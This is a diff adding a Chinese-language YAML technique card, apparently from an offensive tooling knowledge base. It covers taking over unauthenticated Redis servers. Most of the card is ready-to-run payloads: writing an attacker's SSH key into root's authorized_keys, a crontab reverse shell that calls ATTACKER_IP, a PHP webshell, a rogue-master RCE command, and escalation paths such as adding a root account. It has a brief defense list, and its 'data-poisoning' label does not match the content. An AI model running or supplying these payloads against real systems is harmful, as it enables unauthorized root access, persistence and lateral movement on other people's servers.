@@ -1,0 +1,105 @@
+# 技术卡片: Redis 未授权 → SSH Key 写入提权
+# 分类: data-poisoning / redis / rce
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: poison-ops P6 / HackTricks
+
+id: "data-poisoning-redis-ssh-key"
+name: "Redis 未授权 — SSH 公钥写入提权"
+category: "data-poisoning"
+subcategory: "redis-rce"
+severity: "critical"
+
+description: |
+  Redis 未授权访问 → 通过 CONFIG SET 修改持久化路径和文件名 →
+  将 SSH 公钥写入 /root/.ssh/authorized_keys → SSH 免密登录 → 获取 root 权限。
+
+trigger_signals:
+  - "Redis 端口 6379 对外开放且无密码"
+  - "redis-cli -h target ping 返回 PONG"
+  - "CONFIG SET 命令未禁用"
+  - "Redis 以 root 运行"
+  - "目标存在 /root/.ssh/ 目录（或可创建）"
+
+payloads:
+  - technique: "SSH Key 写入 — 标准流程"
+    payload: |
+      # 1. 生成密钥对
+      ssh-keygen -t rsa -f /tmp/redis_key -N '' -q
+      # 2. 写入公钥到 Redis
+      (echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") | redis-cli -h target -x set sshkey
+      # 3. 配置持久化到 authorized_keys
+      redis-cli -h target config set dir /root/.ssh/
+      redis-cli -h target config set dbfilename authorized_keys
+      redis-cli -h target save
+      # 4. SSH 登录
+      ssh -i /tmp/redis_key root@target
+    note: "需 Redis 以 root 运行且有写权限"
+
+  - technique: "Crontab 后门写入"
+    payload: |
+      redis-cli -h target set cron "\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n"
+      redis-cli -h target config set dir /var/spool/cron/
+      redis-cli -h target config set dbfilename root
+      redis-cli -h target save
+    note: "写入 crontab 实现定时反弹 Shell"
+
+  - technique: "WebShell 写入"
+    payload: |
+      redis-cli -h target set shell "<?php system(\$_GET['cmd']); ?>"
+      redis-cli -h target config set dir /var/www/html/
+      redis-cli -h target config set dbfilename shell.php
+      redis-cli -h target save
+    note: "需已知 Web 根目录路径"
+
+  - technique: "主从复制 RCE (Redis 4.x/5.x)"
+    payload: "python3 redis-rogue-server.py -r target -p 6379 -L attacker_ip -P 21000 -f exp.so"
+    note: "利用主从复制加载恶意 .so 模块，适用 Redis 4.x/5.x"
+
+  - technique: "路径绕过 — /etc/cron.d/"
+    payload: |
+      redis-cli -h target config set dir /etc/cron.d/
+      redis-cli -h target config set dbfilename redis-backdoor
+    note: "如果 /var/spool/cron/ 不可写，尝试 /etc/cron.d/"
+
+success_indicators:
+  - "CONFIG SET dir/dbfilename 返回 OK"
+  - "SAVE 命令无报错（检查 .rdb 文件大小变化）"
+  - "SSH 免密登录成功"
+  - "crontab 后门触发，收到反弹 Shell"
+
+prerequisites:
+  - "Redis 未授权访问（无密码或弱密码）"
+  - "CONFIG SET 命令未禁用（Redis < 6.x 默认允许）"
+  - "Redis 进程有目标路径写权限"
+  - "目标路径可被系统识别（如 /root/.ssh/）"
+
+upgrade_paths:
+  - "root SSH 登录 → 完全控制"
+  - "crontab → 持久化反弹 Shell"
+  - "写入 /etc/passwd → 创建 root 账号"
+  - "内网横向移动"
+
+defense:
+  - "Redis 设置强密码（requirepass）"
+  - "禁用 CONFIG 命令或重命名（rename-command CONFIG \"\"）"
+  - "Redis 以非 root 用户运行"
+  - "绑定 127.0.0.1，禁止外网访问"
+  - "启用 protected-mode yes"
+
+tools:
+  - "redis-cli"
+  - "ssh-keygen"
+
+confidence: "high"
+limitations:
+  - "Redis ≥ 6.x 默认 protected-mode 限制外网访问"
+  - "CONFIG 被禁用时需换用主从复制方案"
+  - "写入的文件可能被 Redis RDB 格式污染（前后有二进制数据）"
+  - "验证后必须清理写入的文件"
+
+sources:
+  - agent: "blackmule"
+    date: "2026-07-23"
+  - ref: "HackTricks: Redis"
+  - ref: "CWE-306: Missing Authentication for Critical Function"
